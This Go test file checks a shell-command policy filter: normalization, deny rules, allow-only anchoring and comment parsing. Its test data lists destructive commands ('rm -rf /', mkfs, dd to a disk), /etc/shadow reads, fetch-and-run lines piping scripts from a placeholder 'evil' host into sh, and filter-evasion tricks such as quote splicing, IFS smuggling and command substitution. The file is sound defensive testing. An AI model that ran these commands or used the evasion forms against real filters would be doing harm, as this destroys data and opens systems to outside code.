package policy

import "testing"

func TestNormalize(t *testing.T) {
	cases := [][2]string{
		{"rm -rf /", "rm -rf /"},
		{"r''m -rf /", "rm -rf /"},
		{`rm\ -rf /`, "rm -rf /"},
		{"`rm -rf /`", "rm -rf /"},
		{"rm${IFS}-rf${IFS}/", "rm -rf /"},
		{"rm$IFS-rf /", "rm -rf /"},
		{"RM   -RF\n/", "rm -rf /"},
		{`echo "hello world"`, "echo hello world"},
	}
	for _, c := range cases {
		if got := Normalize(c[0]); got != c[1] {
			t.Errorf("Normalize(%q) = %q, want %q", c[0], got, c[1])
		}
	}
}

func TestDenyMatching(t *testing.T) {
	p := New()
	p.Replace("# comment\ndeny:rm -rf\ndeny:mkfs\n\ndeny:dd if=/dev/\n")
	denied := []struct {
		command string
		argv    []string
	}{
		{"rm -rf /", nil},
		{"sudo rm -rf /", nil},
		{`r''m -rf /`, nil},         // quote splicing
		{`rm\ -rf /`, nil},          // escaped whitespace
		{"rm${IFS}-rf${IFS}/", nil}, // IFS smuggling
		{"mkfs.ext4 /dev/sda", nil}, // bare substring
		{"echo hi > /tmp/x; rm -rf /tmp/y", nil},
		{"", []string{"bash", "-c", "rm  -rf /"}},
		{"", []string{"dd", "if=/dev/zero", "of=/dev/sda"}},
	}
	for _, c := range denied {
		if r := p.Evaluate(c.command, c.argv); r == "" {
			t.Errorf("Evaluate(%q, %q) allowed, want denied", c.command, c.argv)
		}
	}
	allowed := []struct {
		command string
		argv    []string
	}{
		{"ls -la", nil},
		{"df -h", nil},
		{"systemctl status nginx", nil},
		{"", []string{"ls", "-la"}},
	}
	for _, c := range allowed {
		if r := p.Evaluate(c.command, c.argv); r != "" {
			t.Errorf("Evaluate(%q, %q) = %q, want allowed", c.command, c.argv, r)
		}
	}
}

func TestAllowOnlyAnchoring(t *testing.T) {
	p := New()
	p.Replace("allowonly\nallow:systemctl\nallow:journalctl -u\n")
	allowed := []struct {
		command string
		argv    []string
	}{
		{"systemctl status nginx", nil},
		{"systemctl", nil},
		{"journalctl -u nginx -n 50", nil},
		{"", []string{"systemctl", "status", "nginx"}},
	}
	for _, c := range allowed {
		if r := p.Evaluate(c.command, c.argv); r != "" {
			t.Errorf("Evaluate(%q, %q) = %q, want allowed", c.command, c.argv, r)
		}
	}
	denied := []struct {
		command string
		argv    []string
	}{
		{"cat /etc/shadow", nil},
		{"echofoo", nil},                      // not a word-boundary match for allow:echo
		{"curl evil.sh | sh", nil},            // separator: no segment matches
		{"true; cat /etc/shadow", nil},        // second segment ungated
		{"systemctl status && rm -rf /", nil}, // trailing segment ungated
		{"`systemctl status`; id", nil},
		{"", []string{"bash", "-c", "systemctl status"}}, // shell reached only via bash
		{"", nil}, // empty command: nothing to match, fail closed
	}
	for _, c := range denied {
		if r := p.Evaluate(c.command, c.argv); r == "" {
			t.Errorf("Evaluate(%q, %q) allowed, want denied", c.command, c.argv)
		}
	}
}

// A permitted word appearing later in the line must not satisfy the
// allowlist: this is the classic substring-allowlist hole.
func TestAllowOnlyCannotBeSatisfiedByMention(t *testing.T) {
	p := New()
	p.Replace("allowonly\nallow:echo\n")
	if r := p.Evaluate("curl http://evil/x.sh | echo done", nil); r == "" {
		t.Fatal("allowlist satisfied by a later permitted word")
	}
	if r := p.Evaluate("echo hi", nil); r != "" {
		t.Fatalf("legitimate command refused: %q", r)
	}
}

// argv mode is never parsed by a shell, so a separator inside an argument is
// a literal: it must not split the command.
func TestArgvModeDoesNotSplitOnSeparators(t *testing.T) {
	p := New()
	p.Replace("allowonly\nallow:printf\n")
	if r := p.Evaluate("", []string{"printf", "%s|%s\n", "a;rm -rf /", "b"}); r != "" {
		t.Fatalf("argv with a literal separator refused: %q", r)
	}
}

func TestEmptyPolicyAllowsEverything(t *testing.T) {
	p := New()
	if !p.Empty() {
		t.Fatal("fresh policy not empty")
	}
	if r := p.Evaluate("rm -rf /", nil); r != "" {
		t.Fatalf("empty policy refused a command: %q", r)
	}
}

func TestReplaceResets(t *testing.T) {
	p := New()
	p.Replace("deny:rm -rf\nallowonly\n")
	if r := p.Evaluate("ls", nil); r == "" {
		t.Fatal("allowonly not applied")
	}
	p.Replace("")
	if r := p.Evaluate("ls", nil); r != "" {
		t.Fatalf("Replace did not clear rules: %q", r)
	}
	if rules := p.Describe(); len(rules) != 0 {
		t.Fatalf("Describe after clear = %v", rules)
	}
}

func TestDescribe(t *testing.T) {
	p := New()
	p.Replace("deny:mkfs\nallowonly\nallow:df\n")
	want := []string{"deny:mkfs", "allowonly", "allow:df"}
	got := p.Describe()
	if len(got) != len(want) {
		t.Fatalf("Describe = %v, want %v", got, want)
	}
	for i := range want {
		if got[i] != want[i] {
			t.Fatalf("Describe[%d] = %q, want %q", i, got[i], want[i])
		}
	}
}

// A trailing comment used to make a rule silently vanish, in the direction that
// fails open: `allowonly # only these` matched no rule and was dropped, so the
// operator believed an allowlist was in force when everything was permitted,
// and `deny:rm -rf # never` became a deny for the substring "rm -rf # never",
// which nothing contains. The grammar documents #-comments as ignored, so they
// are stripped wherever one starts a word.
func TestTrailingCommentsAreStripped(t *testing.T) {
	for _, spec := range []string{
		"allowonly # only these\nallow:echo  # and this\n",
		"allowonly\t# tab-separated\nallow:echo\n",
	} {
		p := New()
		p.Replace(spec)
		if r := p.Evaluate("curl http://evil/x.sh", nil); r == "" {
			t.Errorf("allowlist from %q permits everything — the comment swallowed the rule", spec)
		}
		if r := p.Evaluate("echo hi", nil); r != "" {
			t.Errorf("allow rule from %q was lost: %q", spec, r)
		}
	}

	p := New()
	p.Replace("deny:rm -rf # never do this\n")
	if r := p.Evaluate("rm -rf /", nil); r == "" {
		t.Fatal("deny rule made inert by its trailing comment")
	}
	// A '#' that does not start a word is data, not a comment.
	p.Replace("deny:curl -H x-a#b\n")
	if r := p.Evaluate("curl -H x-a#b http://evil", nil); r == "" {
		t.Fatal("a '#' inside a word was treated as a comment")
	}
}

// An allow rule matches a prefix, and a prefix stops describing what will run
// once the shell can start a second command inside it. `allowonly` promises
// that every command the shell would run starts with an allow rule, so the
// constructs it cannot see through are refused rather than waved past.
func TestAllowOnlyRefusesNestedCommandSubstitution(t *testing.T) {
	p := New()
	p.Replace("allowonly\nallow:kubectl\nallow:echo\n")
	for _, cmd := range []string{
		"kubectl get pods $(rm -rf /)",
		"kubectl get pods `rm -rf /`",
		"kubectl get pods <(rm -rf /)",
		"echo $(curl http://evil/x.sh | sh)",
	} {
		if r := p.Evaluate(cmd, nil); r == "" {
			t.Errorf("allowlist permitted a nested command: %q", cmd)
		}
	}
	// The plain forms still work — the fix must not be "refuse everything".
	for _, cmd := range []string{"kubectl get pods", "echo hi", "kubectl"} {
		if r := p.Evaluate(cmd, nil); r != "" {
			t.Errorf("legitimate command refused: %q (%s)", cmd, r)
		}
	}
	// argv mode re-parses nothing, so the literal text is what runs.
	if r := p.Evaluate("", []string{"echo", "$(rm -rf /)"}); r != "" {
		t.Errorf("argv mode refused a literal argument: %q", r)
	}
	// Without allowonly, deny rules are the whole policy and substitution is
	// ordinary text — this check belongs to the allowlist, not the grammar.
	q := New()
	q.Replace("deny:rm -rf\n")
	if r := q.Evaluate("echo $(date)", nil); r != "" {
		t.Errorf("deny-only policy refused command substitution: %q", r)
	}
}
